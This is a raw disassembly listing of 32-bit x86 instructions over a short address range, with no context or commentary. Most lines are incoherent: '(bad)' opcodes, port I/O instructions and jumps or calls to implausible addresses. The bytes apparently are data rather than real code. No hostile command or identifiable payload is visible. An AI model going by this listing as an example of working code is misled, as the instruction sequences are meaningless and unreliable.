  4227cb:	icebp  
  4227cc:	into   
  4227cd:	repz out 0xcd,eax
  4227d0:	shl    ebp,0xfa
  4227d3:	ret    0xf8c6
  4227d6:	(bad)  
  4227d7:	fild   DWORD PTR ds:0xefe6fa0e
  4227dd:	mov    cl,0xea
  4227e0:	loop   0x4227d9
  4227e2:	fcmovnu st,st(1)
  4227e4:	clc    
  4227e5:	iret   
  4227e6:	mov    ebx,0xe3c9eada
  4227eb:	(bad)  
  4227ed:	rcr    edx,1
  4227ef:	add    BYTE PTR [edx],al
  4227f1:	icebp  
  4227f2:	sar    bl,1
  4227f4:	mov    esi,0xebe2e104
  4227f9:	fisttp QWORD PTR [esi]
  4227fb:	lods   al,BYTE PTR ds:[esi]
  4227fc:	out    dx,al
  4227fd:	ret    
  4227fe:	(bad)  
  4227ff:	leave  
  422800:	jmp    0x4227f4
  422802:	mov    cl,0xce
  422804:	repz mov cl,0xcb
  422807:	retf   0xcfee
  42280a:	(bad)  
  42280b:	loop   0x4227e7
  42280d:	xlat   BYTE PTR ds:[ebx]
  42280e:	shr    esp,1
  422810:	shl    ch,0xea
  422813:	hlt    
  422814:	fucomp st(6)
  422816:	jmp    0xdf3e2d22
  42281b:	mov    esi,0xd1dcadcc
  422820:	call   0xf11bd9e7
  422825:	iret   
  422826:	fscale 
  422828:	out    dx,eax
  422829:	in     al,dx
  42282a:	sti    
  42282b:	mov    ebx,0xfad0f3e7
  422830:	push   es
  422831:	fcmovne st,st(2)
  422833:	or     bh,dl
  422835:	clc    
  422836:	sti    
  422837:	add    DWORD PTR [edx],eax
  422839:	stc    
  42283a:	out    0xbf,eax
  42283c:	out    dx,eax
  42283d:	neg    ebp
  42283f:	scas   eax,DWORD PTR es:[edi]
  422840:	into   
  422841:	mov    dl,0xf0
  422843:	rol    bh,cl
  422845:	out    0xe5,al
  422847:	mov    edx,0xceeab9f9
  42284c:	out    0xbc,eax
  42284e:	add    eax,esi
  422850:	fcmovnb st,st(4)
  422852:	or     DWORD PTR [edi],eax
  422854:	add    ecx,ebp
  422856:	pop    es
  422857:	fild   WORD PTR [ebx]
  422859:	int    0xfd
  42285b:	mov    ebp,0xd1ebe4cb
  422860:	shl    DWORD PTR [ebp-0x2949290b],1
  422866:	hlt    
  422867:	shr    bh,1
  422869:	cld    
  42286a:	fdivr  st,st(3)
  42286c:	repz shl cl,0x7
  422870:	(bad)  
  422871:	std    
  422872:	ret    
  422873:	cmc    
  422874:	aad    0xde
  422876:	or     DWORD PTR [eax],ecx
  422878:	fdiv   st,st(3)
  42287a:	fnstsw WORD PTR [esi+ebx*8-0x4a360f4e]
  422881:	ror    ch,cl
  422883:	mov    dh,0xcc
  422885:	int3   
  422886:	(bad)  
  422887:	mov    edi,0xdcf9d5b6
  42288c:	add    BYTE PTR [ecx-0x20431000],bh
  422892:	icebp  
  422893:	clc    
  422894:	sti    
  422895:	std    
  422896:	add    eax,0xb07eac5
  42289b:	repnz (bad) 
  42289e:	in     eax,0xd7
  4228a0:	mov    al,0xbb
  4228a2:	call   0xb0faf771
  4228a7:	mov    ah,0xd5
  4228a9:	fptan  
  4228ab:	in     eax,dx
  4228ac:	into   
  4228ad:	shl    bl,0xf5
  4228b0:	(bad)  
  4228b2:	or     bh,cl
  4228b4:	div    bh
  4228b6:	pavgw  mm4,mm3
  4228b9:	rol    DWORD PTR [eax],cl
  4228bb:	mov    ecx,0xdcf7afe1
  4228c0:	repz test eax,0xbbdad3cf
  4228c6:	sti    
  4228c7:	mov    ebx,0xdbb8ffbd
  4228cc:	aad    0xcf
  4228ce:	fcmovb st,st(2)
  4228d0:	rcr    dh,1
  4228d2:	icebp  
  4228d3:	loop   0x4228d4
  4228d5:	(bad)  
  4228d6:	pop    es
  4228d7:	fmul   DWORD PTR [edx]
  4228d9:	(bad)  
  4228db:	loopne 0x42288c
  4228dd:	repz iret 
  4228df:	aad    0xf5
  4228e1:	cli    
  4228e2:	shl    BYTE PTR [ebx-0x28082630],1
  4228e8:	(bad)  
  4228ea:	fucom  st(2)
  4228ec:	fistp  QWORD PTR [ebx+edi*8-0x1f420d25]
  4228f3:	cmc    
  4228f4:	add    esi,esp
  4228f6:	retf   
  4228f7:	(bad)  
  4228f8:	int3   
  4228f9:	or     bh,bh
  4228fb:	iret   
  4228fc:	out    0xec,eax
  4228fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228ff:	lods   al,BYTE PTR ds:[esi]
  422900:	in     eax,0xe9
  422902:	in     eax,0xfa
  422904:	cli    
  422905:	mov    bh,0xe6
  422907:	xlat   BYTE PTR ds:[ebx]
  422908:	stc    
  422909:	out    dx,eax
  42290a:	mov    eax,0xfa07e2f3
  42290f:	in     eax,0xe2
  422911:	add    cl,bl
  422913:	out    0xd9,eax
  422915:	add    BYTE PTR [edx],cl
  422917:	stc    
  422918:	or     edx,ecx
  42291a:	out    0xc5,eax
  42291c:	loope  0x4228ee
  42291e:	lock stos DWORD PTR es:[edi],eax
  422920:	scas   al,BYTE PTR es:[edi]
  422921:	leave  
  422922:	mov    bh,0xb2
  422924:	mov    ch,0xda
  422926:	out    dx,al
  422927:	mov    eax,0xeed5f2c8
  42292c:	fdivr  st(2),st
  42292e:	out    0xd1,eax
  422930:	add    eax,0xcbdd01f3
  422935:	(bad)  
  422936:	enter  0x1c6,0xcf
  42293a:	fsubr  st,st(2)
  42293c:	shr    ecx,0xce
  42293f:	(bad)  
  422941:	call   0xadf5243b
  422946:	aad    0xe5
  422948:	add    ebp,esi
  42294a:	mov    ah,0xc8
  42294c:	(bad)  
  42294d:	fcmovnb st,st(6)
  42294f:	add    dl,dh
  422951:	xlat   BYTE PTR ds:[ebx]
  422952:	(bad)  
  422953:	retf   
  422954:	aad    0xe3
  422956:	mul    dl
  422958:	loop   0x42295d
  42295a:	in     eax,0xd3
  42295c:	ror    dh,0xad
  42295f:	retf   
  422960:	scas   al,BYTE PTR es:[edi]
  422961:	out    0xb6,al
  422963:	cli    
  422964:	loopne 0x42294d
  422966:	aad    0xeb
  422968:	mov    esi,0xfcf4cad1
  42296d:	faddp  st(3),st
  42296f:	in     al,dx
  422970:	sti    
  422971:	pop    es
  422972:	aam    0xe0
  422974:	jmp    0xdb1c2962
  422979:	add    ecx,eax
  42297b:	mov    esp,0xd6eeccc7
  422980:	ror    dl,0xc0
  422983:	stc    
  422984:	out    dx,al
  422985:	(bad)  
  422986:	xlat   BYTE PTR ds:[ebx]
  422987:	cld    
  422988:	fstp   TBYTE PTR [esi-0x9230814]
  42298e:	fild   DWORD PTR [ebx]
  422990:	push   es
  422991:	cli    
  422992:	or     eax,edx
  422994:	ret    0xefe5
  422997:	add    al,cl
  422999:	or     esi,edi
  42299b:	scas   eax,DWORD PTR es:[edi]
  42299c:	out    dx,al
  42299d:	jecxz  0x422952
  42299f:	mov    bl,0xf5
  4229a1:	rcl    ebx,cl
  4229a3:	mov    dh,0xf1
  4229a5:	in     eax,dx
  4229a6:	mov    bh,0xde
  4229a8:	fdivrp st(3),st
  4229aa:	fchs   
  4229ac:	mov    esp,0xc2ede1d2
  4229b1:	(bad)  
  4229b3:	add    eax,ecx
  4229b5:	in     eax,0xe6
  4229b7:	add    BYTE PTR ds:0xcfbefdcb,al
  4229bd:	shr    dl,0xc9
  4229c0:	vaddsubpd ymm0,ymm2,ymm1
  4229c4:	in     al,0xc6
  4229c6:	hlt    
  4229c7:	xlat   BYTE PTR ds:[ebx]
  4229c8:	mov    dh,0xef
  4229ca:	fdivr  st(6),st
  4229cc:	call   esi
  4229ce:	(bad)  
  4229cf:	sar    eax,cl
  4229d1:	lock out 0xc5,al
  4229d4:	pmulhw mm5,mm6
  4229d7:	cld    
  4229d8:	(bad)  
  4229d9:	in     al,0xa
  4229db:	out    0xf1,al
  4229dd:	loope  0x4229a8
  4229df:	out    dx,al
  4229e0:	(bad)  
  4229e1:	call   0xfc19f1ba
  4229e6:	in     eax,dx
  4229e7:	cmc    
  4229e8:	repnz lock mov ah,0x1
  4229ec:	cli    
  4229ed:	fnclex 
  4229ef:	add    bh,BYTE PTR [ebp-0x29fdf91b]
  4229f5:	cld    
  4229f6:	std    
  4229f7:	out    0xcf,eax
  4229f9:	out    dx,eax
  4229fa:	out    dx,eax
  4229fb:	mov    bl,0xf0
  4229fd:	mov    bh,0xbe
  4229ff:	lods   al,BYTE PTR ds:[esi]
  422a00:	rcl    al,cl
  422a02:	lods   al,BYTE PTR ds:[esi]
  422a03:	int    0xbb
  422a05:	(bad)
  422a08:	mov    dh,0xd0
  422a0a:	fmul   st(0),st
  422a0c:	mul    dl
  422a0e:	jecxz  0x422a17
  422a10:	cmc    
  422a11:	call   eax
  422a13:	aad    0x3
  422a15:	out    0x2,al
  422a17:	out    dx,eax
  422a18:	or     esp,ebp
  422a1a:	add    cl,ch
  422a1c:	lods   eax,DWORD PTR ds:[esi]
  422a1d:	in     al,0xd7
  422a1f:	shr    BYTE PTR [edx-0x2e1b0b3b],0xfe
  422a26:	enter  0xd5d5,0xcc
  422a2a:	std    
  422a2b:	cmc    
  422a2c:	mov    eax,0x2e006db
  422a31:	fld    DWORD PTR [ebx+eax*8]
  422a34:	std    
  422a35:	add    ebp,ebx
  422a37:	jecxz  0x422a22
  422a39:	iret   
  422a3a:	call   ecx
  422a3c:	retf   
  422a3d:	mov    esp,0xd5d0dcd7
  422a42:	jmp    0xdafe2a15
  422a47:	mov    ebp,0xd2f0ddf5
  422a4c:	test   edi,0x7fffa05
  422a52:	or     edi,esi
  422a54:	add    eax,0xfcde05e4
  422a59:	stc    
  422a5a:	out    dx,al
  422a5b:	scas   eax,DWORD PTR es:[edi]
  422a5c:	lods   eax,DWORD PTR ds:[esi]
  422a5d:	mov    bl,0xbc
  422a5f:	enter  0xe1ad,0xb1
  422a63:	mov    edx,0xe9ffbace
  422a68:	lock std 
  422a6a:	mov    ebx,0xeef5dbd9
  422a6f:	in     eax,dx
  422a70:	loopne 0x422a78
  422a72:	repnz std 
  422a74:	call   0xc548337e
  422a79:	int3   
  422a7a:	or     al,0xae
  422a7c:	loopne 0x422a4d
  422a7e:	test   al,0xf0
  422a80:	(bad)  
  422a82:	mov    dh,0xb1
  422a84:	lock out dx,eax
  422a86:	std    
  422a87:	(bad)  
  422a88:	fdiv   st(6),st
  422a8a:	fldln2 
  422a8c:	repnz (bad) 
  422a8e:	in     eax,dx
  422a8f:	lock fucomp st(3)
  422a92:	(bad)  
  422a93:	sar    ecx,1
  422a95:	add    al,0xd8
  422a97:	add    eax,0xf0ed01d8
  422a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a9d:	int    0xcc
  422a9f:	rcl    edi,1
  422aa1:	out    0xb3,al
  422aa3:	(bad)  
  422aa4:	in     eax,dx
  422aa5:	mov    ah,0xf2
  422aa7:	jmp    0x422a73
  422aa9:	mov    ebx,0xe7c2dd02
  422aae:	add    eax,0xdbdce2cd
  422ab3:	retf   0xddd9
  422ab6:	in     eax,0xee
  422ab8:	stc    
  422ab9:	jmp    0x422a94
  422abb:	fsubrp st(5),st
  422abd:	(bad)
  422ac1:	mov    bl,0xf7
  422ac3:	sti    
  422ac4:	fcmovu st,st(2)
  422ac6:	aam    0xfc
  422ac8:	retf   
  422ac9:	sar    DWORD PTR [ebx-0x32c232e],1
  422acf:	mov    ebx,0x2f1d3c6
  422ad4:	stc    
  422ad5:	push   cs
  422ad6:	fmul   DWORD PTR [esi]
  422ad8:	retf   
  422ad9:	jmp    0xae06d5df
  422ade:	in     eax,dx
  422adf:	(bad)  
  422ae0:	out    dx,al
  422ae1:	ret    
  422ae2:	aam    0xb5
  422ae4:	shl    edi,cl
  422ae6:	(bad)  
  422ae8:	sar    ebx,1
  422aea:	aad    0xde
  422aec:	add    eax,edi
  422aee:	test   DWORD PTR [ebx],0xe907fb00
  422af4:	rol    ah,0xe
  422af7:	loop   0x422af4
  422af9:	jecxz  0x422ade
  422afb:	mov    eax,0xb5c9dfd0
  422b00:	in     al,dx
  422b01:	out    dx,eax
  422b02:	rcl    esi,1
  422b04:	(bad)  
  422b06:	mov    esi,0xf6d2ebf9
  422b0b:	mov    ecx,0xf1f1bdc3
  422b10:	fcmovnb st,st(0)
  422b12:	loopne 0x422b14
  422b14:	call   0xfc0e25dd
  422b19:	rol    DWORD PTR [eax],cl
  422b1b:	mov    ebp,0xc2e3ddb1
  422b20:	scas   al,BYTE PTR es:[edi]
  422b21:	(bad)  
  422b23:	out    dx,al
  422b24:	loopne 0x422b16
  422b26:	std    
  422b27:	sar    esp,cl
  422b29:	fdiv   st(7),st
  422b2b:	(bad)  
  422b2d:	fsubrp st(7),st
  422b2f:	loop   0x422b1d
  422b31:	loop   0x422b38
  422b33:	dec    DWORD PTR [ecx]
  422b35:	(bad)  
  422b36:	jmp    0xaee6:0xffdb0400
  422b3d:	repnz in eax,dx
  422b3f:	repz retf 
  422b41:	lods   eax,DWORD PTR ds:[esi]
  422b42:	repz mov al,0xdb
  422b45:	(bad)  
  422b47:	out    dx,eax
  422b48:	cld    
  422b49:	ror    bh,1
  422b4b:	add    esi,ecx
  422b4d:	add    esi,esp
  422b4f:	(bad)  
  422b51:	loop   0x422b30
  422b53:	leave  
  422b54:	jmp    0xed1c2f67
  422b59:	loopne 0x422b61
  422b5b:	call   0xf11a134f
  422b60:	mov    bl,0xd6
  422b62:	in     eax,0xc7
  422b64:	icebp  
  422b65:	repnz rcr ebx,1
  422b68:	(bad)  
  422b69:	call   0xe4181d41
  422b6e:	mov    ebp,0x9d1fef3
  422b73:	hlt    
  422b74:	psubsb mm7,mm6
  422b77:	cmc    
  422b78:	or     bl,ah
  422b7a:	add    edi,ebx
  422b7c:	retf   0xe2ae
  422b7f:	mov    al,0xd6
  422b81:	fcmovne st,st(6)
  422b83:	retf   0xcdec
  422b86:	int    0xdd
  422b88:	add    ebp,ebx
  422b8a:	xlat   BYTE PTR ds:[ebx]
  422b8b:	add    bl,bl
  422b8d:	aam    0xdf
  422b8f:	lock shl bh,1
  422b92:	idiv   esp
  422b94:	add    eax,0xc5c4da0b
  422b99:	retf   0xb2c9
  422b9c:	out    0xb7,eax
  422b9e:	shl    DWORD PTR [edx-0x3e364949],0xe6
  422ba5:	(bad)  
  422ba6:	mov    esi,0xe9eeffb5
  422bab:	mov    edi,0xc5f906fe
  422bb0:	ret    
  422bb1:	add    dl,ah
  422bb3:	sti    
  422bb4:	out    dx,eax
  422bb5:	add    al,0x9
  422bb7:	por    mm5,mm2
  422bba:	cld    
  422bbb:	jmp    0xebd4:0xb1f1d0b8
  422bc2:	in     eax,dx
  422bc3:	loope  0x422bb0
  422bc5:	jmp    0xb6361eb2
  422bca:	call   0xe6352a90
  422bcf:	fdivr  st(6),st
  422bd1:	in     al,0xfe
  422bd3:	add    ebx,edx
  422bd5:	(bad)  
  422bd7:	mov    edx,0xbdd2cbc1
  422bdd:	mov    ebp,0xd2ccf1c8
  422be2:	mov    edx,0xb0e7b6d6
  422be7:	mov    edx,0xb8c3dcd6
  422bec:	fxtract 
  422bee:	icebp  
  422bef:	add    eax,0xc7b8daf6
  422bf4:	add    dh,ah
  422bf6:	fucomp st(4)
  422bf8:	fninit 
  422bfa:	out    dx,eax
  422bfb:	(bad)  
  422bfc:	icebp  
  422bfd:	mov    ebp,0xe0f3c4ea
  422c02:	mov    edx,0xf7f7eac8
  422c07:	call   0xb93527dd
  422c0c:	cmc    
  422c0d:	(bad)  
  422c0e:	fadd   st,st(1)
  422c10:	cli    
  422c11:	loop   0x422be4
  422c13:	shl    ebp,1
  422c15:	push   cs
  422c16:	stc    
  422c17:	cld    
  422c18:	add    ebx,edi
  422c1a:	out    0xde,eax
  422c1c:	out    0xe5,al
  422c1e:	scas   eax,DWORD PTR es:[edi]
  422c1f:	scas   eax,DWORD PTR es:[edi]
  422c20:	in     eax,0xb2
  422c22:	mul    cl
  422c24:	fld    TBYTE PTR [ebp-0xc1112]
  422c2a:	rol    DWORD PTR [edx],cl
  422c2c:	out    dx,eax
  422c2d:	out    dx,al
  422c2e:	ret    0xe0f1
  422c31:	hlt    
  422c32:	rol    BYTE PTR [edi+ecx*1],0xd6
  422c36:	dec    bh
  422c38:	pop    es
  422c39:	jmp    0xe4d3:0xf3bfe4e6
  422c40:	in     al,dx
  422c41:	fcmovnbe st,st(7)
  422c43:	(bad)  
  422c44:	hlt    
  422c45:	icebp  
  422c46:	mov    ah,0xb6
  422c48:	in     eax,dx
  422c49:	jmp    ecx
  422c4b:	repnz loop 0x422c06
  422c4e:	ret    
  422c4f:	std    
  422c50:	add    ch,dh
  422c52:	(bad)  
  422c54:	add    eax,DWORD PTR [edi]
  422c56:	sti    
  422c57:	retf   0xcf02
  422c5a:	in     al,dx
  422c5b:	call   0xf5f5184b
  422c60:	mov    dl,0xd2
  422c62:	out    dx,eax
  422c63:	shr    ebx,cl
  422c65:	fcmovbe st,st(6)
  422c67:	out    dx,eax
  422c68:	shr    dh,1
  422c6a:	sar    DWORD PTR [ecx-0x29263f4a],cl
  422c70:	jmp    0x422c65
  422c72:	jmp    0x422c36
  422c74:	(bad)  
  422c75:	fnstcw WORD PTR [edx+eiz*8-0x4e003115]
  422c7c:	test   eax,0xdbc4e4d1
  422c81:	sar    DWORD PTR [edx-0x16302449],1
  422c87:	mov    ah,0xdd
  422c89:	shr    ecx,1
  422c8b:	rol    DWORD PTR [ecx],cl
  422c8d:	fucom  st(7)
  422c8f:	xlat   BYTE PTR ds:[ebx]
  422c90:	add    al,0xb
  422c92:	loope  0x422c96
  422c94:	call   0xd520f271
  422c99:	out    0xcd,al
  422c9b:	shl    dh,0xa9
  422c9e:	jecxz  0x422c7c
  422ca0:	scas   al,BYTE PTR es:[edi]
  422ca1:	jecxz  0x422c8f
  422ca3:	scas   eax,DWORD PTR es:[edi]
  422ca4:	mov    dl,0xcf
  422ca6:	repnz repnz stc 
  422ca9:	icebp  
  422caa:	jecxz  0x422c9e
  422cac:	sar    BYTE PTR [edx+esi*8+0x2c2dff2],0x5
  422cb4:	jmp    0x422c80
  422cb6:	jmp    0x422c9d
  422cb8:	int    0x5
  422cba:	rep stos DWORD PTR es:[edi],eax
  422cbc:	in     al,dx
  422cbd:	int    0xce
  422cbf:	retf   0xf7f2
  422cc2:	mov    ah,0xd8
  422cc4:	push   DWORD PTR [esp+eiz*8-0x720323c]
  422ccb:	jmp    0xe53725a4
  422cd0:	(bad)  
  422cd2:	add    eax,0xcaeb05d9
  422cd7:	in     al,dx
  422cd8:	std    
  422cd9:	std    
  422cda:	pop    es
  422cdb:	mov    ebp,0xc4addea8
  422ce0:	mov    cl,0xc0
  422ce2:	mov    al,0xb7
  422ce4:	in     al,dx
  422ce5:	jmp    0xfd03:0xbbbaf3fe
  422cec:	(bad)  
  422cee:	(bad)  
  422cef:	loope  0x422cd5
  422cf1:	hlt    
  422cf2:	cli    
  422cf3:	mov    edi,0xedd9eafb
  422cf8:	or     eax,0xd8f0e712
  422cfd:	icebp  
  422cfe:	lods   eax,DWORD PTR ds:[esi]
  422cff:	out    0xb3,al
  422d01:	in     eax,0xd3
  422d03:	in     al,dx
  422d04:	scas   al,BYTE PTR es:[edi]
  422d05:	in     eax,0xe9
  422d07:	fst    st(6)
  422d09:	add    ecx,ebp
  422d0b:	(bad)  
  422d0c:	in     al,dx
  422d0d:	jecxz  0x422cec
  422d0f:	add    al,0xfe
  422d11:	repz ror BYTE PTR [ecx],1
  422d14:	cld    
  422d15:	(bad)  
  422d16:	jmp    0xaff3:0xbe6fbdd
  422d1d:	fsubr  st(6),st
  422d1f:	jmp    0xf8eaf304
  422d24:	leave  
  422d25:	jmp    0xeb10ff1c
  422d2a:	loope  0x422d14
  422d2c:	cmc    
  422d2d:	cli    
  422d2e:	fld    QWORD PTR [ecx]
  422d30:	fcmovbe st,st(5)
  422d32:	icebp  
  422d33:	retf   
  422d34:	stc    
  422d35:	add    al,0xd6
  422d37:	out    0xe0,al
  422d39:	int    0x12
  422d3b:	shr    esi,1
  422d3d:	mov    dl,0xb1
  422d3f:	loop   0x422d15
  422d41:	test   eax,0xb5d9f6f8
  422d47:	call   0xcf41f849
  422d4c:	pop    es
  422d4d:	loop   0x422d35
  422d4f:	cmc    
  422d50:	repnz in al,0xd1
  422d53:	ret    
  422d54:	inc    ch
  422d56:	out    0xd8,al
  422d58:	push   cs
  422d59:	fxch   st(6)
  422d5b:	jmp    0xfbe3:0xcbcdb1ce
  422d62:	call   0xcc10041e
  422d67:	(bad)  
  422d69:	mov    edi,0xc1e2c3d6
  422d6e:	repz add eax,edi
  422d71:	(bad)  
  422d72:	add    eax,0x106fae6
  422d77:	aam    0xe8
  422d79:	push   es
  422d7a:	loop   0x422d3e
  422d7c:	in     al,dx
  422d7d:	ret    0xcae7
  422d80:	shl    esi,cl
  422d82:	mov    dl,0xed
  422d84:	(bad)  
  422d85:	aad    0xfb
  422d87:	stc    
  422d88:	mov    edi,0xf2b8b9ce
  422d8d:	fincstp 
  422d8f:	loopne 0x422d64
  422d91:	fsub   st(1),st
  422d93:	in     eax,0xd8
  422d95:	stc    
  422d96:	loop   0x422d66
  422d98:	(bad)  
  422d9a:	paddsw mm6,mm1
  422d9d:	loopne 0x422d43
  422d9f:	mov    ebp,0xc6d2fac9
  422da4:	out    0xbb,eax
  422da6:	out    dx,eax
  422da7:	icebp  
  422da8:	(bad)  
  422daa:	mov    ah,0xe3
  422dac:	out    dx,eax
  422dad:	loop   0x422da4
  422daf:	loop   0x422d90
  422db1:	or     edi,DWORD PTR [ebp+eax*1-0x3416fb36]
  422db8:	or     eax,ebp
  422dba:	add    ebx,ecx
  422dbc:	shl    edx,cl
  422dbe:	ret    0xf5f6
  422dc1:	leave  
  422dc2:	out    0xd7,eax
  422dc4:	call   0xb63e22c0
  422dc9:	loop   0x422d85
  422dcb:	rcr    eax,0xf4
  422dce:	loope  0x422dd0
  422dd0:	add    al,0xc2
  422dd2:	hlt    
  422dd3:	or     ebp,ecx
  422dd5:	cld    
  422dd6:	jmp    0xf91e0bb4
  422ddb:	mov    bl,0xe2
  422ddd:	leave  
  422dde:	call   0xe238e0d6
  422de3:	icebp  
  422de4:	mov    dl,0xf9
  422de6:	mov    edi,0xb4bcf5d4
  422deb:	in     al,dx
  422dec:	rcl    eax,1
  422dee:	mov    esi,0xfb07dcd0
  422df3:	std    
  422df4:	add    edi,ecx
  422df6:	iret   
  422df7:	push   cs
  422df8:	adc    ecx,DWORD PTR [eax]
  422dfa:	in     eax,dx
  422dfb:	mov    cl,0xf0
  422dfd:	(bad)  
  422dfe:	in     al,dx
  422dff:	mov    ch,0xb1
  422e01:	icebp  
  422e02:	jmp    0xeff6:0xdbe5d1bb
  422e09:	cli    
  422e0a:	ret    
  422e0b:	stc    
  422e0c:	into   
  422e0d:	in     al,dx
  422e0e:	lock ret 
  422e10:	add    ah,cl
  422e12:	(bad)  
  422e14:	aad    0xe5
  422e16:	or     ch,cl
  422e18:	adc    esp,ebp
  422e1a:	jmp    0x422dc8
  422e1c:	iret   
  422e1d:	(bad)
  422e20:	leave  
  422e21:	mov    cl,0xcd
  422e23:	rcl    dh,0xe6
  422e26:	in     al,0xdc
  422e28:	fxch   st(4)
  422e2a:	cmc    
  422e2b:	fdivp  st(0),st
  422e2d:	in     eax,dx
  422e2e:	(bad)  
  422e2f:	(bad)  
  422e31:	jecxz  0x422e27
  422e33:	neg    ebp
  422e35:	push   es
  422e36:	jmp    0x2433303
  422e3b:	loop   0x422de3
  422e3d:	mov    bl,0xea
  422e3f:	jmp    0x422e37
  422e41:	loop   0x422e10
  422e43:	in     eax,dx
  422e44:	in     al,dx
  422e45:	leave  
  422e46:	in     al,0xb9
  422e48:	in     eax,dx
  422e49:	jmp    0xe0c3:0xc1d9edc2
  422e50:	push   es
  422e51:	out    0xdd,eax
  422e53:	loop   0x422e58
  422e55:	aad    0xbc
  422e57:	clc    
  422e58:	or     ebx,edi
  422e5a:	or     al,0xcc
  422e5c:	enter  0xbcd7,0xf3
  422e60:	xlat   BYTE PTR ds:[ebx]
  422e61:	in     eax,0xe6
  422e63:	shl    ah,cl
  422e65:	mov    ah,0xd3
  422e67:	mov    ebx,0xbaddcfdb
  422e6c:	mov    eax,0xf5bfddf1
  422e71:	clc    
  422e72:	push   es
  422e73:	in     al,0xdb
  422e75:	jmp    0xc20e:0x1fcff0d
  422e7c:	loopne 0x422e23
  422e7e:	into   
  422e7f:	out    0xee,eax
  422e81:	jecxz  0x422e7d
  422e83:	repz fcmovnbe st,st(4)
  422e86:	out    0xb3,al
  422e88:	repnz lock int 0xed
  422e8c:	loope  0x422e94
  422e8e:	jecxz  0x422e96
  422e90:	in     al,0xdf
  422e92:	shl    dl,0x1
  422e95:	dec    BYTE PTR [eax]
  422e97:	add    ch,cl
  422e99:	sar    ebp,cl
  422e9b:	fxch   st(0)
  422e9d:	enter  0xd2cc,0xe2
  422ea1:	out    0xc1,eax
  422ea3:	stc    
  422ea4:	mov    ecx,0xf3f6d5c8
  422ea9:	imul   dh
  422eab:	mov    ebx,0xf200cddf
  422eb0:	int3   
  422eb1:	fisttp QWORD PTR [edx]
  422eb3:	out    0x9,eax
  422eb5:	sti    
  422eb6:	add    al,0xec
  422eb8:	leave  
  422eb9:	retf   0xec13
  422ebc:	fucomip st,st(2)
  422ebe:	shl    DWORD PTR [edi-0x39381f3a],cl
  422ec4:	out    0xfa,eax
  422ec6:	shl    dh,1
  422ec8:	int    0xcb
  422eca:	loop   0x422eab
  422ecc:	mov    dh,0x0
  422ece:	ret    
  422ecf:	rcr    ecx,cl
  422ed1:	fcmovnbe st,st(4)
  422ed3:	shl    ebp,0xd9
  422ed6:	in     eax,dx
  422ed7:	add    al,BYTE PTR [ebx]
  422ed9:	fdivp  st(6),st
  422edb:	in     al,dx
  422edc:	shr    edx,0xc7
  422edf:	shl    bl,0xc1
  422ee2:	aad    0xd2
  422ee4:	fxam   
  422ee6:	out    0xe9,al
  422ee8:	mov    ecx,0xedccf7da
  422eed:	ret    0xd7c7
  422ef0:	(bad)  
  422ef2:	lock loop 0x422ebb
  422ef5:	aam    0xfb
  422ef7:	ffree  st(4)
  422ef9:	or     ecx,DWORD PTR [ebx]
  422efb:	fidivr WORD PTR [eax-0x3f1b102f]
  422f01:	loopne 0x422eb9
  422f03:	mov    ecx,0xb9beb5cb
  422f08:	jmp    0xe814ebe2
  422f0d:	pop    es
  422f0e:	mov    ebp,0xc7d5d8d7
  422f13:	(bad)  
  422f14:	faddp  st(0),st
  422f16:	into   
  422f17:	fmul   st(2),st
  422f19:	in     al,0x1
  422f1b:	in     al,0xc8
  422f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f1e:	jmp    0xe733dff6
  422f23:	rcl    ebx,0xd8
  422f26:	fucomip st,st(3)
  422f28:	clc    
  422f29:	loop   0x422f14
  422f2b:	loop   0x422eff
  422f2d:	aad    0xf6
  422f2f:	add    eax,edi
  422f31:	sti    
  422f32:	jmp    0xd8ef:0xffc506
  422f39:	or     esi,ebp
  422f3b:	in     eax,0xde
  422f3d:	out    dx,al
  422f3e:	rcl    edi,1
  422f40:	out    0xdb,eax
  422f42:	leave  
  422f43:	loope  0x422f33
  422f45:	clc    
  422f46:	fstp   st(7)
  422f48:	jecxz  0x422f46
  422f4a:	shl    ebp,1
  422f4c:	mov    edx,0xf3cdc6fa
  422f51:	(bad)
  422f54:	retf   0xf605
  422f57:	(bad)  
  422f59:	retf   0xe00e
  422f5c:	mov    esp,0xe6f2a4c3
  422f61:	(bad)  
  422f62:	loopne 0x422f1e
  422f64:	leave  
  422f65:	(bad)  
  422f67:	cld    
  422f68:	clc    
  422f69:	add    edi,esi
  422f6b:	mov    ebx,0xece6daf3
  422f70:	aad    0xf9
  422f72:	jmp    0xd9cd:0xddf5fec3
  422f79:	push   es
  422f7a:	jmp    0x422f26
  422f7c:	repnz into 
  422f7e:	lods   eax,DWORD PTR ds:[esi]
  422f7f:	int3   
  422f80:	ret    0xc2f7
  422f83:	mov    dh,0xc6
  422f85:	stc    
  422f86:	repz call 0xd9322f65
  422f8c:	(bad)  
  422f8e:	mov    ebp,0xe4c3d6bf
  422f93:	fld    st(0)
  422f95:	jmp    0xf1ee:0xc8ddf4e8
  422f9c:	out    0xe3,eax
  422f9e:	in     eax,dx
  422f9f:	mov    esp,0xd0acd7c4
  422fa4:	jmp    0xc3d4:0xecf6c4b6
  422fab:	fcomi  st,st(1)
  422fad:	sar    BYTE PTR [esi+0x5f6e705],1
  422fb3:	(bad)  
  422fb4:	sar    ah,1
  422fb6:	fsubp  st(1),st
  422fb8:	or     al,0xe5
  422fba:	in     al,0xab
  422fbc:	fstp   st(7)
  422fbe:	repnz out dx,al
  422fc0:	scas   al,BYTE PTR es:[edi]
  422fc1:	int3   
  422fc2:	into   
  422fc3:	mov    dh,0xfa
  422fc5:	sti    
  422fc6:	(bad)  [ebp-0x2b093114]
  422fcc:	fdivrp st(2),st
  422fce:	(bad)  
  422fcf:	fiadd  WORD PTR [esi+ebx*8]
  422fd2:	ret    
  422fd3:	ret    
  422fd4:	(bad)  
  422fd5:	lds    ecx,FWORD PTR ds:0xe102c5ef
  422fdb:	shl    bh,1
  422fdd:	test   al,0xad
  422fdf:	out    0xc6,al
  422fe1:	loopne 0x422fae
  422fe3:	scas   eax,DWORD PTR es:[edi]
  422fe4:	mov    cl,0xfe
  422fe6:	(bad)  
  422fe7:	mul    ah
  422fe9:	repnz fadd DWORD PTR [ecx]
  422fec:	aam    0xe1
  422fee:	in     eax,0xc2
  422ff0:	mov    esp,0xe4dbe7d7
  422ff5:	cld    
  422ff6:	loop   0x423001
  422ff8:	inc    BYTE PTR [edi]
  422ffa:	jmp    0xcc0218ad
